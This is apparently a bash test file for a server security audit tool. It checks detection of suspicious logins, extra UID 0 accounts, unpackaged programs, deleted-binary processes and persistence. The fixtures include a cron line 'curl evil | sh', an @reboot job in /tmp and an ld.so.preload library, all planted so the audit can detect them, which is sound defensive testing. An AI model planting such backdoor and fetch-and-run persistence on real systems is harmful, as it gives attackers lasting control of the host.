#!/usr/bin/env bash
# The security audit (vps audit): each part against fixtures (a /proc, /etc,
# logs and program directories under a temporary directory) and mocked system
# commands; what is marked as normal is not reported again.
# shellcheck disable=SC2034,SC2329
set -Eeuo pipefail
HERE="$(CDPATH='' cd -- "$(dirname -- "$0")" && pwd)"
# shellcheck source=/dev/null
source "$HERE/test-common.sh"
load_optimizer_functions verify_line audit_known audit_flag audit_heading audit_owned_paths audit_unowned audit_when audit_clean_text \
  audit_passwd_state audit_logins audit_integrity audit_mark_menu login_recent
TEST_ROOT="$(mktemp -d)"
trap 'rm -rf -- "$TEST_ROOT"' EXIT
fail() { printf 'FAIL: %s\n' "$*" >&2; exit 1; }
ok() { :; }
F="$TEST_ROOT/fs"
STATE_ROOT="$TEST_ROOT/state"
mkdir -p "$STATE_ROOT" "$F"
# The parts that read the system, on the fixtures.
for fn in audit_accounts_keys audit_software audit_running audit_autostart; do
  eval "$(awk -v n="$fn" '$0 == n "() {" {c = 1} c {print} c && $0 == "}" {exit}' "$TEST_SCRIPT" |
    sed -e "s#/proc/#$F/proc/#g" -e "s#/etc/#$F/etc/#g" -e "s#/var/log/#$F/var/log/#g" -e "s#/var/spool/#$F/var/spool/#g" \
        -e "s#/usr/local/#$F/usr/local/#g" -e "s# /opt # $F/opt #g" -e "s#/usr/bin /usr/sbin#$F/usr/bin $F/usr/sbin#g" \
        -e "s#/tmp /var/tmp /dev/shm#$F/tmp $F/var/tmp $F/dev/shm#g")"
done
reset_report() { VERIFY_PASS=0 VERIFY_FAIL=0 VERIFY_NA=0 VERIFY_UNKNOWN=0 VERIFY_NOTICE=0 VERIFY_ISSUES=() AUDIT_MARKS=() AUDIT_IPS=() AUDIT_CONFIGS=(); }
AUDIT_OWNED="$TEST_ROOT/owned"; : > "$AUDIT_OWNED"
now="$(date +%s)"

# 1. Logins: a first-time address can be marked, a known one is counted, the
# console is named; failures and bans are counted.
printf '%s\troot\t203.0.113.5\tpublickey\tssh\t0\n%s\troot\t198.51.100.66\tpassword\tssh\t1\n%s\troot\tconsole:tty1\tconsole\tconsole\t0\n%s\troot\t192.0.2.1\tpassword\tssh\t0\n' \
  "$((now - 9000))" "$((now - 600))" "$((now - 300))" "$((now - 40 * 86400))" > "$STATE_ROOT/logins"
journalctl() { printf 'Failed password for root from 192.0.2.9 port 1 ssh2\nInvalid user admin from 192.0.2.9 port 2\nAccepted publickey for root from 203.0.113.5 port 3 ssh2\n'; }
fail2ban-client() { echo '192.0.2.9 192.0.2.10'; }
reset_report
audit_logins > "$TEST_ROOT/out"
grep -Fq '⚠ 注意  IP 198.51.100.66：最近 30 天第一次出现，登录 1 次（root，密码）' "$TEST_ROOT/out" || fail "first-time address: $(cat "$TEST_ROOT/out")"
grep -Fq '⚠ 注意  服务商控制台：登录过 1 次（root）' "$TEST_ROOT/out" || fail 'console login not named'
grep -Fq '✔ 正常  登录：1 个 IP 以前就登录过或标记过正常' "$TEST_ROOT/out" || fail "known addresses: $(cat "$TEST_ROOT/out")"
if grep -Fq 192.0.2.1 "$TEST_ROOT/out"; then fail 'a login older than 30 days was reported'; fi
grep -Fq '过去 24 小时 2 次' "$TEST_ROOT/out" && grep -Fq '正在封禁 2 个 IP' "$TEST_ROOT/out" || fail 'failures and bans not counted'
[[ "${#AUDIT_MARKS[@]}" == 1 && "${AUDIT_MARKS[0]%%$'\t'*}" == ip ]] || fail "marks: ${AUDIT_MARKS[*]}"
printf 'ip 198.51.100.66\n' > "$STATE_ROOT/known"
reset_report; audit_logins > "$TEST_ROOT/out"
if grep -Fq '198.51.100.66' "$TEST_ROOT/out"; then fail 'an address marked as normal was reported'; fi
: > "$STATE_ROOT/known"
printf 'PASS: the audit lists first-time addresses and console logins of the last 30 days, and counts failures.\n'

# 2. Accounts and keys: a second UID 0 and an empty password are suspect; a key
# not marked as normal is listed, a marked one is not.
mkdir -p "$F/home/ops/.ssh" "$F/root/.ssh" "$F/etc/sudoers.d"
getent() { printf 'root:x:0:0::%s:/bin/bash\nops:x:1000:1000::%s:/bin/bash\nbackup:x:0:0::/nonexistent:/bin/sh\nwww:x:33:33::/var/www:/usr/sbin/nologin\n' "$F/root" "$F/home/ops"; }
passwd() { case "$2" in root) echo 'root P 2026-01-01 0 99999 7 -1' ;; ops) echo 'ops NP 2026-01-01 0 99999 7 -1' ;; *) echo "$2 L" ;; esac; }
: > "$F/home/ops/.ssh/authorized_keys"
ssh-keygen() { echo '256 SHA256:abcdef ops@laptop (ED25519)'; }
printf 'ops ALL=(ALL) NOPASSWD:ALL\n' > "$F/etc/sudoers.d/90-cloud"
journalctl() { echo 'new user: name=backup, UID=0, GID=0, home=/nonexistent, shell=/bin/sh'; }
reset_report
audit_accounts_keys > "$TEST_ROOT/out"
grep -Fq '✖ 可疑  UID 0 账户：除了 root 还有：backup' "$TEST_ROOT/out" || fail "a second UID 0: $(cat "$TEST_ROOT/out")"
grep -Fq '✖ 可疑  账户 ops：没有密码' "$TEST_ROOT/out" || fail 'an empty password not suspect'
grep -Fq '⚠ 注意  账户 ops 的公钥：SHA256:abcdef（ops@laptop (ED25519)）' "$TEST_ROOT/out" || fail "key not listed: $(cat "$TEST_ROOT/out")"
grep -Fq '⚠ 注意  新建的账户：最近 30 天：backup' "$TEST_ROOT/out" || fail 'a new account not listed'
grep -Fq 'sudo 免密码' "$TEST_ROOT/out" || fail 'NOPASSWD not listed'
grep -Fq '能登录的账户：root ops backup' "$TEST_ROOT/out" || fail "accounts: $(cat "$TEST_ROOT/out")"
printf 'key SHA256:abcdef\nfile %s\n' "$F/etc/sudoers.d/90-cloud" > "$STATE_ROOT/known"
reset_report; audit_accounts_keys > "$TEST_ROOT/out"
if grep -Fq 'SHA256:abcdef' "$TEST_ROOT/out" || grep -Fq 'sudo 免密码' "$TEST_ROOT/out"; then fail 'a key or file marked as normal was reported'; fi
: > "$STATE_ROOT/known"
printf 'PASS: the audit flags a second UID 0 and empty passwords, and lists unmarked keys and NOPASSWD.\n'

# 3. Software: new packages apart from this tool's, own programs, programs of
# no package in system directories, programs in temporary directories.
mkdir -p "$F/var/log" "$F/usr/local/bin" "$F/opt/xray" "$F/usr/bin" "$F/usr/sbin" "$F/tmp" "$F/var/tmp" "$F/dev/shm" "$STATE_ROOT/restore-v2/packages"
d="$(date +%F)"
printf '%s 10:00:00 install fail2ban:all <none> 1.0\n%s 10:01:00 install nmap:amd64 <none> 7.9\n%s 10:02:00 upgrade bash:amd64 5.1 5.2\n' "$d" "$d" "$d" > "$F/var/log/dpkg.log"
printf 'fail2ban\n' > "$STATE_ROOT/restore-v2/packages/installed"
printf '#!/bin/sh\n' | tee "$F/opt/xray/xray" "$F/usr/local/bin/vps" "$F/usr/bin/ls" "$F/usr/bin/evil" "$F/tmp/.x" > /dev/null
chmod +x "$F/opt/xray/xray" "$F/usr/local/bin/vps" "$F/usr/bin/ls" "$F/usr/bin/evil" "$F/tmp/.x"
printf '%s\n' "$F/usr/bin/ls" | LC_ALL=C sort > "$AUDIT_OWNED"
reset_report
audit_software > "$TEST_ROOT/out"
grep -Fq '⚠ 注意  新装的软件包：最近 30 天（不算本工具装的）：nmap' "$TEST_ROOT/out" || fail "new packages: $(cat "$TEST_ROOT/out")"
if grep -Fq 'bash' "$TEST_ROOT/out"; then fail 'an upgrade counted as a new package'; fi
grep -Fq "自己装的程序：$F/opt/xray/xray" "$TEST_ROOT/out" || fail 'an own program not listed'
if grep -Fq "$F/usr/local/bin/vps" "$TEST_ROOT/out"; then fail "this tool's own command listed"; fi
grep -Fq "✖ 可疑  系统目录里的程序：$F/usr/bin/evil 不属于任何软件包" "$TEST_ROOT/out" || fail "a program of no package: $(cat "$TEST_ROOT/out")"
if grep -Fq "$F/usr/bin/ls " "$TEST_ROOT/out"; then fail 'a program of a package was flagged'; fi
grep -Fq "✖ 可疑  临时目录里的程序：$F/tmp/.x" "$TEST_ROOT/out" || fail 'a program in /tmp not flagged'
printf 'PASS: the audit lists new packages, own programs and programs of no package or in temporary directories.\n'

# 4. Running: a deleted program is suspect (a replaced one only a notice), one
# from /tmp too, one of no package a notice, other mount namespaces skipped.
readlink() { cat "$1"; }
mkproc() { mkdir -p "$F/proc/$1/ns"; printf '%s' "$2" > "$F/proc/$1/exe"; printf '%s\n' "$3" > "$F/proc/$1/comm"; printf '%s' "${4:-mnt:[1]}" > "$F/proc/$1/ns/mnt"; }
mkproc 1 /usr/lib/systemd/systemd systemd
mkproc 100 "$F/usr/bin/ls (deleted)" ls
mkproc 101 '/usr/bin/gone (deleted)' miner
mkproc 102 /tmp/kworker kworker
# (The fixtures live under /tmp themselves: this one is given a path outside.)
mkproc 103 /opt/xray/xray xray
mkproc 104 /usr/bin/node node 'mnt:[2]'
printf '%s\n' /usr/lib/systemd/systemd "$F/usr/bin/ls" | LC_ALL=C sort > "$AUDIT_OWNED"
ps() { printf '103 95.0 3600 xray\n1 0.1 99999 systemd\n'; }
ss() { printf 'tcp LISTEN 0 128 0.0.0.0:22 0.0.0.0:* users:(("sshd",pid=1,fd=3))\ntcp LISTEN 0 128 127.0.0.1:5432 0.0.0.0:* users:(("postgres",pid=2,fd=3))\n'; }
reset_report
audit_running > "$TEST_ROOT/out"
grep -Fq '⚠ 注意  进程 ls：' "$TEST_ROOT/out" && grep -Fq '已被换成新文件' "$TEST_ROOT/out" || fail "a replaced program: $(cat "$TEST_ROOT/out")"
grep -Fq '✖ 可疑  进程 miner（101）：程序文件 /usr/bin/gone 已被删掉' "$TEST_ROOT/out" || fail 'a deleted program not suspect'
grep -Fq '✖ 可疑  进程 kworker（102）：从临时目录运行：/tmp/kworker' "$TEST_ROOT/out" || fail 'a program from /tmp not suspect'
grep -Fq '⚠ 注意  不属于软件包的程序在运行：/opt/xray/xray' "$TEST_ROOT/out" || fail 'a running program of no package not listed'
grep -Fq '进程 xray（103）：运行 60 分钟，平均占 95.0% CPU' "$TEST_ROOT/out" || fail 'a CPU hog not listed'
if grep -Fq node "$TEST_ROOT/out"; then fail "a container's process was checked"; fi
grep -Fxq '✔ 正常  对外监听的端口：22/tcp(sshd)' "$TEST_ROOT/out" && ! grep -Fq 5432 "$TEST_ROOT/out" || fail "listening ports: $(cat "$TEST_ROOT/out")"
printf 'exe /opt/xray/xray\n' > "$STATE_ROOT/known"
reset_report; audit_running > "$TEST_ROOT/out"
if grep -Fq xray "$TEST_ROOT/out"; then fail 'a program marked as normal was reported'; fi
: > "$STATE_ROOT/known"
unset -f readlink
printf 'PASS: the audit flags deleted and temporary programs, lists programs of no package and CPU hogs, skips containers.\n'

# 5. Autostart: own units and cron jobs, crontabs, ld.so.preload.
mkdir -p "$F/etc/systemd/system" "$F/etc/cron.d" "$F/var/spool/cron/crontabs" "$F/etc/profile.d"
printf '[Service]\nExecStart=/opt/xray/xray run\n' > "$F/etc/systemd/system/xray.service"
printf '[Unit]\n' > "$F/etc/systemd/system/vps-stable-guard.service"
printf '* * * * * root curl evil | sh\n' > "$F/etc/cron.d/backdoor"
printf '0 3 * * * root true\n' > "$F/etc/cron.d/owned"
printf '# m h dom\n@reboot /tmp/.x\n' > "$F/var/spool/cron/crontabs/root"
printf '/lib/libhide.so\n' > "$F/etc/ld.so.preload"
printf '%s\n' "$F/etc/cron.d/owned" | LC_ALL=C sort > "$AUDIT_OWNED"
reset_report
audit_autostart > "$TEST_ROOT/out"
grep -Fq "自己加的服务：$F/etc/systemd/system/xray.service（ExecStart=/opt/xray/xray run）" "$TEST_ROOT/out" || fail "own unit: $(cat "$TEST_ROOT/out")"
if grep -Fq vps-stable-guard "$TEST_ROOT/out"; then fail "this tool's own unit listed"; fi
grep -Fq "定时任务：$F/etc/cron.d/backdoor 不属于任何软件包" "$TEST_ROOT/out" && ! grep -Fq "$F/etc/cron.d/owned" "$TEST_ROOT/out" || fail 'cron files'
grep -Fq '账户 root 的定时任务：@reboot /tmp/.x' "$TEST_ROOT/out" || fail 'a crontab not listed'
# (The label is the path, rewritten to the fixture here.)
grep -Fq "✖ 可疑  $F/etc/ld.so.preload：让每个程序先加载：/lib/libhide.so" "$TEST_ROOT/out" || fail 'ld.so.preload not suspect'
printf 'PASS: the audit lists own units, cron jobs and crontabs, and flags ld.so.preload.\n'

# 6. System files: a changed program is suspect, a changed configuration file
# only listed, a missing file a notice.
installed() { [[ "$1" == openssh-server || "$1" == coreutils ]]; }
dpkg() { [[ "$1" == --verify ]] || return 1; printf '??5??????   /usr/bin/ls\n??5?????? c /etc/ssh/sshd_config\nmissing     /usr/share/doc/x/README\n'; }
reset_report
audit_integrity quick > "$TEST_ROOT/out"
grep -Fq '✖ 可疑  被改过的系统文件：/usr/bin/ls 和软件包里的不一样' "$TEST_ROOT/out" || fail "a changed program: $(cat "$TEST_ROOT/out")"
[[ "${AUDIT_CONFIGS[*]}" == /etc/ssh/sshd_config ]] || fail "configuration files: ${AUDIT_CONFIGS[*]}"
grep -Fq '⚠ 注意  缺少的文件：/usr/share/doc/x/README' "$TEST_ROOT/out" || fail 'a missing file'
# Quick: the key packages only; deep: every package. (dpkg runs in a
# process substitution: its arguments are kept in a file.)
dpkg() { printf '%s\n' "$*" > "$TEST_ROOT/dpkg-args"; }
audit_integrity quick > /dev/null; [[ "$(cat "$TEST_ROOT/dpkg-args")" == '--verify openssh-server coreutils' ]] || fail "quick check: $(cat "$TEST_ROOT/dpkg-args")"
audit_integrity all > "$TEST_ROOT/out"; [[ "$(cat "$TEST_ROOT/dpkg-args")" == --verify ]] || fail "deep check: $(cat "$TEST_ROOT/dpkg-args")"
grep -Fq '所有软件包的程序都和安装时一样' "$TEST_ROOT/out" || fail 'a clean deep check'
printf 'PASS: the audit checks the key packages quickly, every package when asked, and lists changed configuration apart.\n'

# Marking as normal: chosen numbers, all, and taking some back.
AUDIT_MARKS=($'ip\t198.51.100.66\tIP 198.51.100.66：x' $'key\tSHA256:abc\t公钥：y' $'exe\t/opt/x\t程序：z')
: > "$STATE_ROOT/known"
printf '1 3\n' | audit_mark_menu > /dev/null
[[ "$(cat "$STATE_ROOT/known")" == $'ip 198.51.100.66\nexe /opt/x' ]] || fail "marked: $(cat "$STATE_ROOT/known")"
printf 'a\n' | audit_mark_menu > /dev/null
[[ "$(wc -l < "$STATE_ROOT/known")" == 3 ]] || fail 'all not marked once each'
printf 'u\n1\n' | audit_mark_menu > /dev/null
[[ "$(cat "$STATE_ROOT/known")" == $'exe /opt/x\nkey SHA256:abc' ]] || fail "taken back: $(cat "$STATE_ROOT/known")"
printf '\n' | audit_mark_menu > /dev/null
[[ "$(wc -l < "$STATE_ROOT/known")" == 2 ]] || fail 'Enter changed the marks'
printf 'PASS: findings are marked as normal by number or all, and marks can be taken back.\n'
